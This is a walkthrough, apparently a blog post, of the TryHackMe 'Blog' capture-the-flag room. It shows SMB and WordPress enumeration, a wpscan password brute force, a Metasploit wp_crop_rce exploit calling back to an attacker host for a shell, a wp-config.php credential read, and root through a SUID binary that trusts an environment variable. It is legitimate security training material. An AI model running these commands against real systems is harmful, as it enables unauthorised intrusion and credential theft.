---
title: "Blog"
date: 2025-08-09
draft: false
summary: "Writeup for Blog CTF challenge on TryHackMe."
tags: ["linux", "rce", "suid"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/blog/cover.webp"
  caption: "Blog TryHackMe Challenge"
  alt: "Blog cover"
platform: "TryHackMe"
---

Billy Joel made a Wordpress blog!
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/blog

## Reconnaissance

I performed an **nmap** aggressive scan on the target to identify open ports, services running on them and additional details about those services.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN blog.nmap
```

![](https://cdn.ziomsec.com/blog/1.webp)

The `http-robots.txt` **nse** script revealed the presence of a *robots.txt* file on the web application running on the target. Before accessing the web application, I mapped the domain with it's IP in my *hosts* file.

## Foothold

Since there was  SAMBA server running, I enumerated its shares and found a share with read / write access.

```shell
smbmap -H blog.thm
```

![](https://cdn.ziomsec.com/blog/2.webp)

I accessed the share and found a bunch of media. Maybe, these were being hosted on the web application. So, I switched to enumerating the web application.

```shell
smbclient \\\\blog.thm\\BillySMB
```

![](https://cdn.ziomsec.com/blog/3.webp)

![](https://cdn.ziomsec.com/blog/4.webp)

The home page had nothing special except 2 full names which could be a user on the target. I then navigated to *robots.txt* file to see if it had any interesting endpoints. 

![](https://cdn.ziomsec.com/blog/5.webp)

The *wp-admin* page would require a valid username and password. Since, this was a wordpress installation, I tried using the *wp-json* endpoint and found valid usernames.

![](https://cdn.ziomsec.com/blog/6.webp)

I confirmed the validity of these usernames on the *wp-login* page. Since, I had no passwords for these usernames or any other endpoint, I switched back to the SMB server and downloaded the media.

At first, it looked like normal videos and images.

![](https://cdn.ziomsec.com/blog/7.webp)

![](https://cdn.ziomsec.com/blog/8.webp)

When I tried using **stegseek** to extract any hidden data from *Alice-White-Rabbit.jpg*, I found found a new text file which revealed it was just a rabbit hole.

```shell
stegseek Alice-White-Rabbit.jpg
```

![](https://cdn.ziomsec.com/blog/9.webp)

I then tried brute forcing the passwords using **wpscan** and found the credential for *kwheel*.

```shell
wpscan --url http://blog.thm/wp-login.php -U username-list -P /usr/share/wordlists/rockyou.txt
```

![](https://cdn.ziomsec.com/blog/10.webp)

I logged into wordpress with these credentials but found nothing interesting at first.

![](https://cdn.ziomsec.com/blog/11.webp)

I then searched for vulnerabilities related to the *wordpress* version running on the target and found something interesting. The version on the target was vulnerable to path traversal and LFI which could be exploited by a **metasploit** module.
- https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce/

I started **metasploit framework** and selected the exploit.

```shell
use exploit/multi/http/wp_crop_rce
set PASSWORD cutiepie1
set USERNAME kwheel
set LHOST ATTACKER
set RHOSTS TARGET
run
```

I configured the necessary values and ran the exploit to get a shell as *www-data*.

![](https://cdn.ziomsec.com/blog/12.webp)

## Privilege Escalation

I then viewed the *wp-config.php* file for database credentials to find other passwords.

```shell
cat /var/www/wordpress/wp-config.php
```

![](https://cdn.ziomsec.com/blog/13.webp)

After logging into the sql server, I found the password hash of *kjoel*, however, I was not able to crack it.

![](https://cdn.ziomsec.com/blog/14.webp)

So, I searched the home directory for any clues and found Billy's termination letter.

![](https://cdn.ziomsec.com/blog/15.webp)

I downloaded the pdf onto my local system. The letter mentioned some reasons why Billy was terminated. The media policy seemed interesting. Maybe Billy used insecure storage mediums like USBs?

![](https://cdn.ziomsec.com/blog/16.webp)

Maybe there was a Media connected to the target machine. So, I checked the */media* folder and found a usb owned by *Billy*.

![](https://cdn.ziomsec.com/blog/17.webp)

With no other clues, I enumerated binaries with **SUID** bit and found an uncommon binary called **checker**.

```shell
find / -user root -perm -u=s -ls 2>/dev/null
```

![](https://cdn.ziomsec.com/blog/18.webp)

The binary was owned by root so I couldn't modify it. I executed it and got a text on my terminal stating I am not an admin.

```shell
/usr/sbin/checker
```

![](https://cdn.ziomsec.com/blog/19.webp)

I used **ltrace** to investigate the library function calls made by **checker** while running.

```
ltrace /usr/sbin/checker
```

![](https://cdn.ziomsec.com/blog/20.webp)

The program checks for an environment variable called `admin` and if it doesn't find it, it says "Not an Admin". So, we could try setting the variable (it does not check the value. So we could set any value):

```shell
export admin=1
ltrace /usr/sbin/checker
```

If the binary behaves differently, it means that it is dependent on the `admin` variable and could allow admin access.

![](https://cdn.ziomsec.com/blog/21.webp)

The binary would change the uid to `0` i.e that of root. So, I executed the binary and got root access.

```
export admin=1
/usr/sbin/checker
```

![](https://cdn.ziomsec.com/blog/22.webp)

I then captured the root flag from the *root* directory.

```shell
cat /root/root.txt
```

![](https://cdn.ziomsec.com/blog/23.webp)

I then navigated to the *USB* and found the user flag aswell.

```shell
cat /media/usb/user.txt
```

![](https://cdn.ziomsec.com/blog/24.webp)

Alternatively, we could also exploit the **SUID** bit set on the **pkexec** binary and get root access using **PwnKit** exploit.
- https://github.com/ly4k/PwnKit

![](https://cdn.ziomsec.com/blog/25.webp)

That's it from my side! Until next time :)

---
